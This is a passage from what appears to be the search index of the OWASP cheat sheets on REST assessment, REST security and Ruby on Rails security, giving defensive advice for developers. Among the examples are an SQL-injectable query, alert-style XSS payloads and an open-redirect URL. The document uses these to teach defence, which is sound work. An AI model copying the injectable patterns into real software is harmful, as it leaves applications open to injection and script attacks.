be better off if some level of white box testing is allowed and you can get information about the service. This information will ensure fuller coverage of the attack surface. Such information to look for: Formal service description - While for other types of web services such as SOAP a formal description, usually in WSDL is often available, this is seldom the case for REST. That said, either WSDL 2.0 or WADL can describe REST and are sometimes used. A developer guide for using the service may be less detailed but will commonly be found, and might even be considered black box . Application source or configuration - in many frameworks, including dotNet ,the REST service definition might be easily obtained from configuration files rather than from code. Collect full requests using a proxy - while always an important pen testing step, this is more important for REST based applications as the application UI may not give clues on the actual attack surface. Note that the proxy must be able to collect full requests and not just URLs as REST services utilize more than just GET parameters. Analyze collected requests to determine the attack surface: Look for non-standard parameters: Look for abnormal HTTP headers - those would many times be header based parameters. Determine if a URL segment has a repeating pattern across URLs. Such patterns can include a date, a number or an ID like string and indicate that the URL segment is a URL embedded parameter. For example: http://server/srv/2013-10-21/use.php Look for structured parameter values - those may be JSON, XML or a non-standard structure. If the last element of a URL does not have an extension, it may be a parameter. This is especially true if the application technology normally uses extensions or if a previous segment does have an extension. For example: http://server/svc/Grid.asmx/GetRelatedListItems Look for highly varying URL segments - a single URL segment that has many values may be parameter and not a physical directory. For example if the URL http://server/src/XXXX/page repeats with hundreds of value for XXXX , chances XXXX is a parameter. Verify non-standard parameters: in some cases (but not all), setting the value of a URL segment suspected of being a parameter to a value expected to be invalid can help determine if it is a path elements of a parameter. If a path element, the web server will return a 404 message, while for an invalid value to a parameter the answer would be an application level message as the value is legal at the web server level. Analyzing collected requests to optimize fuzzing - after identifying potential parameters to fuzz, analyze the collected values for each to determine: Valid vs. invalid values, so that fuzzing can focus on marginal invalid values. For example sending 0 for a value found to be always a positive integer. Sequences allowing to fuzz beyond the range presumably allocated to the current user. Lastly, when fuzzing , don't forget to emulate the authentication mechanism used.","title":"How to pentest a RESTful web service"},{"location":"cheatsheets/REST_Assessment_Cheat_Sheet.html#related-resources","text":"REST Security Cheat Sheet - the other side of this cheat sheet RESTful services, web security blind spot - a presentation (including video) elaborating on most of the topics on this cheat sheet.","title":"Related Resources"},{"location":"cheatsheets/REST_Security_Cheat_Sheet.html","text":"REST Security Cheat Sheet \u00b6 Introduction \u00b6 REST (or RE presentational S tate T ransfer) is an architectural style first described in Roy Fielding 's Ph.D. dissertation on Architectural Styles and the Design of Network-based Software Architectures . It evolved as Fielding wrote the HTTP/1.1 and URI specs and has been proven to be well-suited for developing distributed hypermedia applications. While REST is more widely applicable, it is most commonly used within the context of communicating with services via HTTP. The key abstraction of information in REST is a resource. A REST API resource is identified by a URI, usually a HTTP URL. REST components use connectors to perform actions on a resource by using a representation to capture the current or intended state of the resource and transferring that representation. The primary connector types are client and server, secondary connectors include cache, resolver and tunnel. REST APIs are stateless. Stateful APIs do not adhere to the REST architectural style. State in the REST acronym refers to the state of the resource which the API accesses, not the state of a session within which the API is called. While there may be good reasons for building a stateful API, it is important to realize that managing sessions is complex and difficult to do securely. Stateful services are out of scope of this Cheat Sheet: Passing state from client to backend, while making the service technically stateless, is an anti-pattern that should also be avoided as it is prone to replay and impersonation attacks. In order to implement flows with REST APIs, resources are typically created, read, updated and deleted. For example, an ecommerce site may offer methods to create an empty shopping cart, to add items to the cart and to check out the cart. Each of these REST calls is stateless and the endpoint should check whether the caller is authorized to perform the requested operation. Another key feature of REST applications is the use of standard HTTP verbs and error codes in the pursuit or removing unnecessary variation among different services. Another key feature of REST applications is the use of HATEOAS or Hypermedia As The Engine of Application State . This provides REST applications a self-documenting nature making it easier for developers to interact with a REST service without prior knowledge. HTTPS \u00b6 Secure REST services must only provide HTTPS endpoints. This protects authentication credentials in transit, for example passwords, API keys or JSON Web Tokens. It also allows clients to authenticate the service and guarantees integrity of the transmitted data. See the Transport Layer Protection Cheat Sheet for additional information. Consider the use of mutually authenticated client-side certificates to provide additional protection for highly privileged web services. Access Control \u00b6 Non-public REST services must perform access control at each API endpoint. Web services in monolithic applications implement this by means of user authentication, authorisation logic and session management. This has several drawbacks for modern architectures which compose multiple microservices following the RESTful style. in order to minimize latency and reduce coupling between services, the access control decision should be taken locally by REST endpoints user authentication should be centralised in a Identity Provider (IdP), which issues access tokens JWT \u00b6 There seems to be a convergence towards using JSON Web Tokens (JWT) as the format for security tokens. JWTs are JSON data structures containing a set of claims that can be used for access control decisions. A cryptographic signature or message authentication code (MAC) can be used to protect the integrity of the JWT. Ensure JWTs are integrity protected by either a signature or a MAC. Do not allow the unsecured JWTs: {\"alg\":\"none\"} . See here In general, signatures should be preferred over MACs for integrity protection of JWTs. If MACs are used for integrity protection, every service that is able to validate JWTs can also create new JWTs using the same key. This means that all services using the same key have to mutually trust each other. Another consequence of this is that a compromise of any service also compromises all other services sharing the same key. See here for additional information. The relying party or token consumer validates a JWT by verifying its integrity and claims contained. A relying party must verify the integrity of the JWT based on its own configuration or hard-coded logic. It must not rely on the information of the JWT header to select the verification algorithm. See here and here Some claims have been standardised and should be present in JWT used for access controls. At least the following of the standard claims should be verified: iss or issuer - is this a trusted issuer? Is it the expected owner of the signing key? aud or audience - is the relying party in the target audience for this JWT? exp or expiration time - is the current time before the end of the validity period of this token? nbf or not before time - is the current time after the start of the validity period of this token? As JWTs contain details of the authenticated entity (user etc.) a disconnect can occur between the JWT and the current state of the users session, for example, if the session is terminated earlier than the expiration time due to an explicit logout or an idle timeout. When an explicit session termination event occurs, a digest or hash of any associated JWTs should be submitted to a blacklist on the API which will invalidate that JWT for any requests until the expiration of the token. See the JSON_Web_Token_for_Java_Cheat_Sheet for further details. API Keys \u00b6 Public REST services without access control run the risk of being farmed leading to excessive bills for bandwidth or compute cycles. API keys can be used to mitigate this risk. They are also often used by organisation to monetize APIs; instead of blocking high-frequency calls, clients are given access in accordance to a purchased access plan. API keys can reduce the impact of denial-of-service attacks. However, when they are issued to third-party clients, they are relatively easy to compromise. Require API keys for every request to the protected endpoint. Return 429 Too Many Requests HTTP response code if requests are coming in too quickly. Revoke the API key if the client violates the usage agreement. Do not rely exclusively on API keys to protect sensitive, critical or high-value resources. Restrict HTTP methods \u00b6 Apply a whitelist of permitted HTTP Methods e.g. GET , POST , PUT . Reject all requests not matching the whitelist with HTTP response code 405 Method not allowed . Make sure the caller is authorised to use the incoming HTTP method on the resource collection, action, and record In Java EE in particular, this can be difficult to implement properly. See Bypassing Web Authentication and Authorization with HTTP Verb Tampering for an explanation of this common misconfiguration. Input validation \u00b6 Do not trust input parameters/objects. Validate input: length / range / format and type. Achieve an implicit input validation by using strong types like numbers, booleans, dates, times or fixed data ranges in API parameters. Constrain string inputs with regexps. Reject unexpected/illegal content. Make use of validation/sanitation libraries or frameworks in your specific language. Define an appropriate request size limit and reject requests exceeding the limit with HTTP response status 413 Request Entity Too Large. Consider logging input validation failures. Assume that someone who is performing hundreds of failed input validations per second is up to no good. Have a look at input validation cheat sheet for comprehensive explanation. Use a secure parser for parsing the incoming messages. If you are using XML, make sure to use a parser that is not vulnerable to XXE and similar attacks. Validate content types \u00b6 A REST request or response body should match the intended content type in the header. Otherwise this could cause misinterpretation at the consumer/producer side and lead to code injection/execution. Document all supported content types in your API. Validate request content types \u00b6 Reject requests containing unexpected or missing content type headers with HTTP response status 406 Unacceptable or 415 Unsupported Media Type . For XML content types ensure appropriate XML parser hardening, see the XXE cheat sheet . Avoid accidentally exposing unintended content types by explicitly defining content types e.g. Jersey (Java) @consumes(\"application/json\"); @produces(\"application/json\") . This avoids XXE-attack vectors for example. Send safe response content types \u00b6 It is common for REST services to allow multiple response types (e.g. application/xml or application/json , and the client specifies the preferred order of response types by the Accept header in the request. Do NOT simply copy the Accept header to the Content-type header of the response. Reject the request (ideally with a 406 Not Acceptable response) if the Accept header does not specifically contain one of the allowable types. Services including script code (e.g. JavaScript) in their responses must be especially careful to defend against header injection attack. Ensure sending intended content type headers in your response matching your body content e.g. application/json and not application/javascript . Management endpoints \u00b6 Avoid exposing management endpoints via Internet. If management endpoints must be accessible via the Internet, make sure that users must use a strong authentication mechanism, e.g. multi-factor. Expose management endpoints via different HTTP ports or hosts preferably on a different NIC and restricted subnet. Restrict access to these endpoints by firewall rules or use of access control lists. Error handling \u00b6 Respond with generic error messages - avoid revealing details of the failure unnecessarily. Do not pass technical details (e.g. call stacks or other internal hints) to the client. Audit logs \u00b6 Write audit logs before and after security related events. Consider logging token validation errors in order to detect attacks. Take care of log injection attacks by sanitising log data beforehand. Security Headers \u00b6 There are a number of security related headers that can be returned in the HTTP responses to instruct browsers to act in specific ways. However, some of these headers are intended to be used with HTML responses, and as such may provide little or no security benefits on an API that does not return HTML. The following headers should be included in all API responses: Header Rationale Cache-Control: no-store Prevent sensitive information from being cached. Content-Security-Policy: frame-ancestors 'none' To protect against drag-and-drop style clickjacking attacks. Content-Type To specify the content type of the response. This should be application/json for JSON responses. Strict-Transport-Security To require connections over HTTPS and to protect against spoofed certificates. X-Content-Type-Options: nosniff To prevent browsers from performing MIME sniffing, and inappropriately interpreting responses as HTML. X-Frame-Options: DENY To protect against drag-and-drop style clickjacking attacks. The headers below are only intended to provide additional security when responses are rendered as HTML. As such, if the API will never return HTML in responses, then these headers may not be necessary. However, if there is any uncertainty about the function of the headers, or the types of information that the API returns (or may return in future), then it is recommended to include them as part of a defence-in-depth approach. Header Rationale Content-Security-Policy: default-src 'none' The majority of CSP functionality only affects pages rendered as HTML. Feature-Policy: 'none' Feature policies only affect pages rendered as HTML. Referrer-Policy: no-referrer Non-HTML responses should not trigger additional requests. CORS \u00b6 Cross-Origin Resource Sharing (CORS) is a W3C standard to flexibly specify what cross-domain requests are permitted. By delivering appropriate CORS Headers your REST API signals to the browser which domains, AKA origins, are allowed to make JavaScript calls to the REST service. Disable CORS headers if cross-domain calls are not supported/expected. Be as specific as possible and as general as necessary when setting the origins of cross-domain calls. Sensitive information in HTTP requests \u00b6 RESTful web services should be careful to prevent leaking credentials. Passwords, security tokens, and API keys should not appear in the URL, as this can be captured in web server logs, which makes them intrinsically valuable. In POST / PUT requests sensitive data should be transferred in the request body or request headers. In GET requests sensitive data should be transferred in an HTTP Header. OK: https://example.com/resourceCollection/[ID]/action https://twitter.com/vanderaj/lists NOT OK: https://example.com/controller/123/action?apiKey=a53f435643de32 because API Key is into the URL. HTTP Return Code \u00b6 HTTP defines status code . When designing REST API, don't just use 200 for success or 404 for error. Always use the semantically appropriate status code for the response. Here is a non-exhaustive selection of security related REST API status codes . Use it to ensure you return the correct code. Code Message Description 200 OK Response to a successful REST API action. The HTTP method can be GET, POST, PUT, PATCH or DELETE. 201 Created The request has been fulfilled and resource created. A URI for the created resource is returned in the Location header. 202 Accepted The request has been accepted for processing, but processing is not yet complete. 301 Moved Permanently Permanent redirection. 304 Not Modified Caching related response that returned when the client has the same copy of the resource as the server. 307 Temporary Redirect Temporary redirection of resource. 400 Bad Request The request is malformed, such as message body format error. 401 Unauthorized Wrong or no authentication ID/password provided. 403 Forbidden It's used when the authentication succeeded but authenticated user doesn't have permission to the request resource. 404 Not Found When a non-existent resource is requested. 405 Method Not Acceptable The error for an unexpected HTTP method. For example, the REST API is expecting HTTP GET, but HTTP PUT is used. 406 Unacceptable The client presented a content type in the Accept header which is not supported by the server API. 413 Payload too large Use it to signal that the request size exceeded the given limit e.g. regarding file uploads. 415 Unsupported Media Type The requested content type is not supported by the REST service. 429 Too Many Requests The error is used when there may be DOS attack detected or the request is rejected due to rate limiting. 500 Internal Server Error An unexpected condition prevented the server from fulfilling the request. Be aware that the response should not reveal internal information that helps an attacker, e.g. detailed error messages or stack traces. 501 Not Implemented The REST service does not implement the requested operation yet. 503 Service Unavailable The REST service is temporarily unable to process the request. Used to inform the client it should retry at a later time. Additional information about HTTP return code usage in REST API can be found here and here .","title":"REST Security"},{"location":"cheatsheets/REST_Security_Cheat_Sheet.html#rest-security-cheat-sheet","text":"","title":"REST Security Cheat Sheet"},{"location":"cheatsheets/REST_Security_Cheat_Sheet.html#introduction","text":"REST (or RE presentational S tate T ransfer) is an architectural style first described in Roy Fielding 's Ph.D. dissertation on Architectural Styles and the Design of Network-based Software Architectures . It evolved as Fielding wrote the HTTP/1.1 and URI specs and has been proven to be well-suited for developing distributed hypermedia applications. While REST is more widely applicable, it is most commonly used within the context of communicating with services via HTTP. The key abstraction of information in REST is a resource. A REST API resource is identified by a URI, usually a HTTP URL. REST components use connectors to perform actions on a resource by using a representation to capture the current or intended state of the resource and transferring that representation. The primary connector types are client and server, secondary connectors include cache, resolver and tunnel. REST APIs are stateless. Stateful APIs do not adhere to the REST architectural style. State in the REST acronym refers to the state of the resource which the API accesses, not the state of a session within which the API is called. While there may be good reasons for building a stateful API, it is important to realize that managing sessions is complex and difficult to do securely. Stateful services are out of scope of this Cheat Sheet: Passing state from client to backend, while making the service technically stateless, is an anti-pattern that should also be avoided as it is prone to replay and impersonation attacks. In order to implement flows with REST APIs, resources are typically created, read, updated and deleted. For example, an ecommerce site may offer methods to create an empty shopping cart, to add items to the cart and to check out the cart. Each of these REST calls is stateless and the endpoint should check whether the caller is authorized to perform the requested operation. Another key feature of REST applications is the use of standard HTTP verbs and error codes in the pursuit or removing unnecessary variation among different services. Another key feature of REST applications is the use of HATEOAS or Hypermedia As The Engine of Application State . This provides REST applications a self-documenting nature making it easier for developers to interact with a REST service without prior knowledge.","title":"Introduction"},{"location":"cheatsheets/REST_Security_Cheat_Sheet.html#https","text":"Secure REST services must only provide HTTPS endpoints. This protects authentication credentials in transit, for example passwords, API keys or JSON Web Tokens. It also allows clients to authenticate the service and guarantees integrity of the transmitted data. See the Transport Layer Protection Cheat Sheet for additional information. Consider the use of mutually authenticated client-side certificates to provide additional protection for highly privileged web services.","title":"HTTPS"},{"location":"cheatsheets/REST_Security_Cheat_Sheet.html#access-control","text":"Non-public REST services must perform access control at each API endpoint. Web services in monolithic applications implement this by means of user authentication, authorisation logic and session management. This has several drawbacks for modern architectures which compose multiple microservices following the RESTful style. in order to minimize latency and reduce coupling between services, the access control decision should be taken locally by REST endpoints user authentication should be centralised in a Identity Provider (IdP), which issues access tokens","title":"Access Control"},{"location":"cheatsheets/REST_Security_Cheat_Sheet.html#jwt","text":"There seems to be a convergence towards using JSON Web Tokens (JWT) as the format for security tokens. JWTs are JSON data structures containing a set of claims that can be used for access control decisions. A cryptographic signature or message authentication code (MAC) can be used to protect the integrity of the JWT. Ensure JWTs are integrity protected by either a signature or a MAC. Do not allow the unsecured JWTs: {\"alg\":\"none\"} . See here In general, signatures should be preferred over MACs for integrity protection of JWTs. If MACs are used for integrity protection, every service that is able to validate JWTs can also create new JWTs using the same key. This means that all services using the same key have to mutually trust each other. Another consequence of this is that a compromise of any service also compromises all other services sharing the same key. See here for additional information. The relying party or token consumer validates a JWT by verifying its integrity and claims contained. A relying party must verify the integrity of the JWT based on its own configuration or hard-coded logic. It must not rely on the information of the JWT header to select the verification algorithm. See here and here Some claims have been standardised and should be present in JWT used for access controls. At least the following of the standard claims should be verified: iss or issuer - is this a trusted issuer? Is it the expected owner of the signing key? aud or audience - is the relying party in the target audience for this JWT? exp or expiration time - is the current time before the end of the validity period of this token? nbf or not before time - is the current time after the start of the validity period of this token? As JWTs contain details of the authenticated entity (user etc.) a disconnect can occur between the JWT and the current state of the users session, for example, if the session is terminated earlier than the expiration time due to an explicit logout or an idle timeout. When an explicit session termination event occurs, a digest or hash of any associated JWTs should be submitted to a blacklist on the API which will invalidate that JWT for any requests until the expiration of the token. See the JSON_Web_Token_for_Java_Cheat_Sheet for further details.","title":"JWT"},{"location":"cheatsheets/REST_Security_Cheat_Sheet.html#api-keys","text":"Public REST services without access control run the risk of being farmed leading to excessive bills for bandwidth or compute cycles. API keys can be used to mitigate this risk. They are also often used by organisation to monetize APIs; instead of blocking high-frequency calls, clients are given access in accordance to a purchased access plan. API keys can reduce the impact of denial-of-service attacks. However, when they are issued to third-party clients, they are relatively easy to compromise. Require API keys for every request to the protected endpoint. Return 429 Too Many Requests HTTP response code if requests are coming in too quickly. Revoke the API key if the client violates the usage agreement. Do not rely exclusively on API keys to protect sensitive, critical or high-value resources.","title":"API Keys"},{"location":"cheatsheets/REST_Security_Cheat_Sheet.html#restrict-http-methods","text":"Apply a whitelist of permitted HTTP Methods e.g. GET , POST , PUT . Reject all requests not matching the whitelist with HTTP response code 405 Method not allowed . Make sure the caller is authorised to use the incoming HTTP method on the resource collection, action, and record In Java EE in particular, this can be difficult to implement properly. See Bypassing Web Authentication and Authorization with HTTP Verb Tampering for an explanation of this common misconfiguration.","title":"Restrict HTTP methods"},{"location":"cheatsheets/REST_Security_Cheat_Sheet.html#input-validation","text":"Do not trust input parameters/objects. Validate input: length / range / format and type. Achieve an implicit input validation by using strong types like numbers, booleans, dates, times or fixed data ranges in API parameters. Constrain string inputs with regexps. Reject unexpected/illegal content. Make use of validation/sanitation libraries or frameworks in your specific language. Define an appropriate request size limit and reject requests exceeding the limit with HTTP response status 413 Request Entity Too Large. Consider logging input validation failures. Assume that someone who is performing hundreds of failed input validations per second is up to no good. Have a look at input validation cheat sheet for comprehensive explanation. Use a secure parser for parsing the incoming messages. If you are using XML, make sure to use a parser that is not vulnerable to XXE and similar attacks.","title":"Input validation"},{"location":"cheatsheets/REST_Security_Cheat_Sheet.html#validate-content-types","text":"A REST request or response body should match the intended content type in the header. Otherwise this could cause misinterpretation at the consumer/producer side and lead to code injection/execution. Document all supported content types in your API.","title":"Validate content types"},{"location":"cheatsheets/REST_Security_Cheat_Sheet.html#validate-request-content-types","text":"Reject requests containing unexpected or missing content type headers with HTTP response status 406 Unacceptable or 415 Unsupported Media Type . For XML content types ensure appropriate XML parser hardening, see the XXE cheat sheet . Avoid accidentally exposing unintended content types by explicitly defining content types e.g. Jersey (Java) @consumes(\"application/json\"); @produces(\"application/json\") . This avoids XXE-attack vectors for example.","title":"Validate request content types"},{"location":"cheatsheets/REST_Security_Cheat_Sheet.html#send-safe-response-content-types","text":"It is common for REST services to allow multiple response types (e.g. application/xml or application/json , and the client specifies the preferred order of response types by the Accept header in the request. Do NOT simply copy the Accept header to the Content-type header of the response. Reject the request (ideally with a 406 Not Acceptable response) if the Accept header does not specifically contain one of the allowable types. Services including script code (e.g. JavaScript) in their responses must be especially careful to defend against header injection attack. Ensure sending intended content type headers in your response matching your body content e.g. application/json and not application/javascript .","title":"Send safe response content types"},{"location":"cheatsheets/REST_Security_Cheat_Sheet.html#management-endpoints","text":"Avoid exposing management endpoints via Internet. If management endpoints must be accessible via the Internet, make sure that users must use a strong authentication mechanism, e.g. multi-factor. Expose management endpoints via different HTTP ports or hosts preferably on a different NIC and restricted subnet. Restrict access to these endpoints by firewall rules or use of access control lists.","title":"Management endpoints"},{"location":"cheatsheets/REST_Security_Cheat_Sheet.html#error-handling","text":"Respond with generic error messages - avoid revealing details of the failure unnecessarily. Do not pass technical details (e.g. call stacks or other internal hints) to the client.","title":"Error handling"},{"location":"cheatsheets/REST_Security_Cheat_Sheet.html#audit-logs","text":"Write audit logs before and after security related events. Consider logging token validation errors in order to detect attacks. Take care of log injection attacks by sanitising log data beforehand.","title":"Audit logs"},{"location":"cheatsheets/REST_Security_Cheat_Sheet.html#security-headers","text":"There are a number of security related headers that can be returned in the HTTP responses to instruct browsers to act in specific ways. However, some of these headers are intended to be used with HTML responses, and as such may provide little or no security benefits on an API that does not return HTML. The following headers should be included in all API responses: Header Rationale Cache-Control: no-store Prevent sensitive information from being cached. Content-Security-Policy: frame-ancestors 'none' To protect against drag-and-drop style clickjacking attacks. Content-Type To specify the content type of the response. This should be application/json for JSON responses. Strict-Transport-Security To require connections over HTTPS and to protect against spoofed certificates. X-Content-Type-Options: nosniff To prevent browsers from performing MIME sniffing, and inappropriately interpreting responses as HTML. X-Frame-Options: DENY To protect against drag-and-drop style clickjacking attacks. The headers below are only intended to provide additional security when responses are rendered as HTML. As such, if the API will never return HTML in responses, then these headers may not be necessary. However, if there is any uncertainty about the function of the headers, or the types of information that the API returns (or may return in future), then it is recommended to include them as part of a defence-in-depth approach. Header Rationale Content-Security-Policy: default-src 'none' The majority of CSP functionality only affects pages rendered as HTML. Feature-Policy: 'none' Feature policies only affect pages rendered as HTML. Referrer-Policy: no-referrer Non-HTML responses should not trigger additional requests.","title":"Security Headers"},{"location":"cheatsheets/REST_Security_Cheat_Sheet.html#cors","text":"Cross-Origin Resource Sharing (CORS) is a W3C standard to flexibly specify what cross-domain requests are permitted. By delivering appropriate CORS Headers your REST API signals to the browser which domains, AKA origins, are allowed to make JavaScript calls to the REST service. Disable CORS headers if cross-domain calls are not supported/expected. Be as specific as possible and as general as necessary when setting the origins of cross-domain calls.","title":"CORS"},{"location":"cheatsheets/REST_Security_Cheat_Sheet.html#sensitive-information-in-http-requests","text":"RESTful web services should be careful to prevent leaking credentials. Passwords, security tokens, and API keys should not appear in the URL, as this can be captured in web server logs, which makes them intrinsically valuable. In POST / PUT requests sensitive data should be transferred in the request body or request headers. In GET requests sensitive data should be transferred in an HTTP Header. OK: https://example.com/resourceCollection/[ID]/action https://twitter.com/vanderaj/lists NOT OK: https://example.com/controller/123/action?apiKey=a53f435643de32 because API Key is into the URL.","title":"Sensitive information in HTTP requests"},{"location":"cheatsheets/REST_Security_Cheat_Sheet.html#http-return-code","text":"HTTP defines status code . When designing REST API, don't just use 200 for success or 404 for error. Always use the semantically appropriate status code for the response. Here is a non-exhaustive selection of security related REST API status codes . Use it to ensure you return the correct code. Code Message Description 200 OK Response to a successful REST API action. The HTTP method can be GET, POST, PUT, PATCH or DELETE. 201 Created The request has been fulfilled and resource created. A URI for the created resource is returned in the Location header. 202 Accepted The request has been accepted for processing, but processing is not yet complete. 301 Moved Permanently Permanent redirection. 304 Not Modified Caching related response that returned when the client has the same copy of the resource as the server. 307 Temporary Redirect Temporary redirection of resource. 400 Bad Request The request is malformed, such as message body format error. 401 Unauthorized Wrong or no authentication ID/password provided. 403 Forbidden It's used when the authentication succeeded but authenticated user doesn't have permission to the request resource. 404 Not Found When a non-existent resource is requested. 405 Method Not Acceptable The error for an unexpected HTTP method. For example, the REST API is expecting HTTP GET, but HTTP PUT is used. 406 Unacceptable The client presented a content type in the Accept header which is not supported by the server API. 413 Payload too large Use it to signal that the request size exceeded the given limit e.g. regarding file uploads. 415 Unsupported Media Type The requested content type is not supported by the REST service. 429 Too Many Requests The error is used when there may be DOS attack detected or the request is rejected due to rate limiting. 500 Internal Server Error An unexpected condition prevented the server from fulfilling the request. Be aware that the response should not reveal internal information that helps an attacker, e.g. detailed error messages or stack traces. 501 Not Implemented The REST service does not implement the requested operation yet. 503 Service Unavailable The REST service is temporarily unable to process the request. Used to inform the client it should retry at a later time. Additional information about HTTP return code usage in REST API can be found here and here .","title":"HTTP Return Code"},{"location":"cheatsheets/Ruby_on_Rails_Cheat_Sheet.html","text":"Ruby on Rails Cheatsheet \u00b6 Introduction \u00b6 This Cheatsheet intends to provide quick basic Ruby on Rails security tips for developers. It complements, augments or emphasizes points brought up in the Rails security guide from rails core. The Rails framework abstracts developers from quite a bit of tedious work and provides the means to accomplish complex tasks quickly and with ease. New developers, those unfamiliar with the inner-workings of Rails, likely need a basic set of guidelines to secure fundamental aspects of their application. The intended purpose of this doc is to be that guide. Items \u00b6 Command Injection \u00b6 Ruby offers a function called \"eval\" which will dynamically build new Ruby code based on Strings. It also has a number of ways to call system commands. eval ( \"ruby code here\" ) system ( \"os command here\" ) `ls -al /` # (backticks contain os command) exec ( \"os command here\" ) open ( \"\\| os command here\" ) While the power of these commands is quite useful, extreme care should be taken when using them in a Rails based application. Usually, its just a bad idea. If need be, a whitelist of possible values should be used and any input should be validated as thoroughly as possible. The guides from Rails and OWASP contain further information on command injection. SQL Injection \u00b6 Ruby on Rails is often used with an ORM called ActiveRecord, though it is flexible and can be used with other data sources. Typically very simple Rails applications use methods on the Rails models to query data. Many use cases protect for SQL Injection out of the box. However, it is possible to write code that allows for SQL Injection. name = params [ :name ] @projects = Project . where ( \"name like '\" + name + \"'\" ); The statement is injectable because the name parameter is not escaped. Here is the idiom for building this kind of statement: @projects = Project . where ( \"name like ?\" , \"% #{ params [ :name ] } %\" ) Use caution not to build SQL statements based on user controlled input. A list of more realistic and detailed examples is here: rails-sqli.org . OWASP has extensive information about SQL Injection . Cross-site Scripting (XSS) \u00b6 By default, protection against XSS comes as the default behavior. When string data is shown in views, it is escaped prior to being sent back to the browser. This goes a long way, but there are common cases where developers bypass this protection - for example to enable rich text editing. In the event that you want to pass variables to the front end with tags intact, it is tempting to do the following in your .erb file (ruby markup). # Wrong! Do not do this! < %= raw @product.name %> # Wrong! Do not do this! <%= @product . name . html_safe %> # Wrong! Do not do this! <%= content_tag @product.name %> Unfortunately, any field that uses raw , html_safe , content_tag or similar like this will be a potential XSS target. Note that there are also widespread misunderstandings about html_safe() . This writeup describes the underlying SafeBuffer mechanism in detail. Other tags that change the way strings are prepared for output can introduce similar issues, including content_tag. content_tag ( \"/><script>alert('hack!');</script>\" ) # XSS example # produces: </><script>alert('hack!');</script>><//><script>alert('hack!');</script>> The method html_safe of String is somewhat confusingly named. It means that we know for sure the content of the string is safe to include in HTML without escaping. This method itself is un-safe! If you must accept HTML content from users, consider a markup language for rich text in an application (Examples include: Markdown and textile) and disallow HTML tags. This helps ensures that the input accepted doesn't include HTML content that could be malicious. If you cannot restrict your users from entering HTML, consider implementing content security policy to disallow the execution of any JavaScript. And finally, consider using the #sanitize method that let's you whitelist allowed tags. Be careful, this method has been shown to be flawed numerous times and will never be a complete solution. An often overlooked XSS attack vector for older versions of rails is the href value of a link: <%= link_to \"Personal Website\" , @user . website %> If @user.website contains a link that starts with javascript: , the content will execute when a user clicks the generated link: < a href = \"javascript:alert('Haxored')\" > Personal Website </ a > Newer Rails versions escape such links in a better way. link_to \"Personal Website\" , 'javascript:alert(1);' . html_safe () # Will generate: # \"<a href=\"javascript:alert(1);\">Personal Website</a>\" Using Content Security Policy is one more security measure to forbid execution for links starting with javascript: . Brakeman scanner helps in finding XSS problems in Rails apps. OWASP provides more general information about XSS in a top level page: Cross-site Scripting (XSS) . Sessions \u00b6 By default, Ruby on Rails uses a Cookie based session store. What that means is that unless you change something, the session will not expire on the server. That means that some default applications may be vulnerable to replay attacks. It also means that sensitive information should never be put in the session. The best practice is to use a database based session, which thankfully is very easy with Rails: Project :: Application . config . session_store :active_record_store There is an Session Management Cheat Sheet . Authentication \u00b6 As with all sensitive data, start securing your authentication with enabling TLS in your configuration: # config/environments/production.rb # Force all access to the app over SSL, use Strict-Transport-Security, # and use secure cookies config . force_ssl = true Uncomment the line 3 as above in your configuration. Generally speaking, Rails does not provide authentication by itself. However, most developers using Rails leverage libraries such as Devise or AuthLogic to provide authentication. To enable authentication it is possible to use Devise gem. Install it using: gem 'devise' Then install it to the user model: rails generate devise:install Next, specify which resources (routes) require authenticated access in routes: Rails . application . routes . draw do authenticate :user do resources :something do # these resource require authentication ... end end devise_for :users # sign-up/-in/out routes root to : 'static#home' # no authentication required end To enforce password complexity, it is possible to use zxcvbn gem . Configure your user model with it: class User < ApplicationRecord devise :database_authenticatable , # other devise features, then :zxcvbnable end And configure the required password complexity: # in config/initializers/devise.rb Devise . setup do \\ | config \\ | # zxcvbn score for devise config . min_password_score = 4 # complexity score here. ... You can try out this PoC to learn more about it. Next, omniauth gem allows for multiple strategies for authentication. Using it one can configure secure authentication with Facebook, LDAP and many other providers. Read on here . Token Authentication \u00b6 Devise usually uses Cookies for authentication. In the case token authentication is wished instead, it could be implemented with a gem devise_token_auth . It supports multiple front end technologies, for example angular2-token. This gem is configured similar to the devise gem itself. It also requires omniauth as a dependency. # token-based authentication gem 'devise_token_auth' gem 'omniauth' Then a route is defined: mount_devise_token_auth_for 'User' , at : 'auth' And the User model is modified accordingly. These actions can be done with one command: rails g devise_token_auth:install [ USER_CLASS ] [ MOUNT_PATH ] You may need to edit the generated migration to avoid unnecessary fields and/or field duplication depending on your use case. Note: when you use only token authentication, there is no more need in CSRF protection in controllers. If you use both ways: cookies and tokens, the paths where cookies are used for authentication still must be protected from forgery! There is an Authentication Cheat Sheet . Insecure Direct Object Reference or Forceful Browsing \u00b6 By default, Ruby on Rails apps use a RESTful URI structure. That means that paths are often intuitive and guessable. To protect against a user trying to access or modify data that belongs to another user, it is important to specifically control actions. Out of the gate on a vanilla Rails application, there is no such built-in protection. It is possible to do this by hand at the controller level. It is also possible, and probably recommended, to consider resource-based access control libraries such as cancancan (cancan replacement) or pundit to do this. This ensures that all operations on a database object are authorized by the business logic of the application. More general information about this class of vulnerability is in the OWASP Top 10 Page . CSRF (Cross Site Request Forgery) \u00b6 Ruby on Rails has specific, built-in support for CSRF tokens. To enable it, or ensure that it is enabled, find the base ApplicationController and look for a directive such as the following: class ApplicationController < ActionController :: Base protect_from_forgery Note that the syntax for this type of control includes a way to add exceptions. Exceptions may be useful for APIs or other reasons - but should be reviewed and consciously included. In the example below, the Rails ProjectController will not provide CSRF protection for the show method. class ProjectController < ApplicationController protect_from_forgery except : :show Also note that by default Rails does not provide CSRF protection for any HTTP GET request. Note: if you use token authentication only, there is no need to protect from CSRF in controllers like this. If cookie-based authentication is used on some paths, then the protections is still required on them. There is a top level OWASP page for Cross-Site Request Forgery (CSRF) . Redirects and Forwards \u00b6 Web applications often require the ability to dynamically redirect users based on client-supplied data. To clarify, dynamic redirection usually entails the client including a URL in a parameter within a request to the application. Once received by the application, the user is redirected to the URL specified in the request. For example: http://www.example.com/redirect?url=http://www.example_commerce_site.com/checkout The above request would redirect the user to http://www.example.com/checkout . The security concern associated with this functionality is leveraging an organization's trusted brand to phish users and trick them into visiting a malicious site, in our example, badhacker.com . Example: http://www.example.com/redirect?url=http://badhacker.com The most basic, but restrictive protection is to use the :only_path option. Setting this to true will essentially strip out any host information. However, the :only_path option must be part of the first argument. If the first argument is not a hash table, then there is no way to pass in this option. In the absence of a custom helper or whitelist, this is one approach that can 